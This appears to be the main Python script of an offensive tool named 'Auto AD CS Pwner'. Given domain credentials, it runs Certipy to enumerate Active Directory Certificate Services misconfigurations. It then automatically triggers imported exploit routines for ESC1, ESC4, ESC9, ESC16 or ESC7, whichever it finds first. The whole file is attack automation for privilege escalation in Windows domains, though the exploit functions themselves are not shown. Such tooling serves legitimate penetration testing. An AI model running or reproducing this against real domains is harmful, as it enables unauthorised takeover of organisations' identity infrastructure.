from utils.certipy_runner import (
    run_certipy_find, save_results_to_json, 
    exploit_esc1, exploit_esc4, exploit_esc7, 
    exploit_esc9, exploit_esc16, exploit_esc1_domain_computer
)
from utils.parser import parse_stdout_output
import argparse
import os
import subprocess

def main():
    parser = argparse.ArgumentParser(description="Auto AD CS Pwner")
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)

    args = parser.parse_args()

    print("[*] Running Certipy to find vulnerable templates...")
    output = run_certipy_find(args.username, args.password, args.domain, args.dc_ip)

    if output is None:
        print("[!] Failed to get Certipy output")
        return

    parsed_data = parse_stdout_output(output)
    save_results_to_json(parsed_data, "output/certipy-find-output.json")

    # Check for vulnerabilities in priority order
    esc1_templates = [t for t in parsed_data if t.get("vuln") == "ESC1"]
    esc4_templates = [t for t in parsed_data if t.get("vuln") == "ESC4"]
    esc9_templates = [t for t in parsed_data if t.get("vuln") == "ESC9"]
    esc16_cas = [t for t in parsed_data if t.get("vuln") == "ESC16"]
    esc7_cas = [t for t in parsed_data if t.get("vuln") == "ESC7"]

    if esc1_templates:
        template = esc1_templates[0]
        print(f"[+] Detected ESC1 on template: {template['template_name']}")
        exploit_esc1(
            username=args.username,
            password=args.password,
            domain=args.domain,
            dc_ip=args.dc_ip,
            ca_name=template["ca_name"],
            template_name=template["template_name"],
            output=output
        )
    elif esc4_templates:
        template = esc4_templates[0]
        print(f"[+] Detected ESC4 on template: {template['template_name']}")
        exploit_esc4(
            username=args.username,
            password=args.password,
            domain=args.domain,
            dc_ip=args.dc_ip,
            ca_name=template["ca_name"],
            template_name=template["template_name"]
        )
    elif esc9_templates:
        template = esc9_templates[0]
        print(f"[+] Detected ESC9 on template: {template['template_name']}")
        exploit_esc9(
            username=args.username,
            password=args.password,
            domain=args.domain,
            dc_ip=args.dc_ip,
            ca_name=template["ca_name"],
            template_name=template["template_name"]
        )
    elif esc16_cas:
        ca = esc16_cas[0]
        print(f"[+] Detected ESC16 on CA: {ca['ca_name']}")
        exploit_esc16(
            username=args.username,
            password=args.password,
            domain=args.domain,
            dc_ip=args.dc_ip,
            ca_name=ca["ca_name"]
        )
    elif esc7_cas:
        ca = esc7_cas[0]
        print(f"[+] Detected ESC7 on CA: {ca['ca_name']}")
        exploit_esc7(
            username=args.username,
            password=args.password,
            domain=args.domain,
            dc_ip=args.dc_ip,
            ca_name=ca["ca_name"]
        )
    else:
        print(f"[!] No exploitable templates (ESC1, ESC4, ESC7, ESC9, or ESC16) found in domain {args.domain}.")

if __name__ == "__main__":
    main()
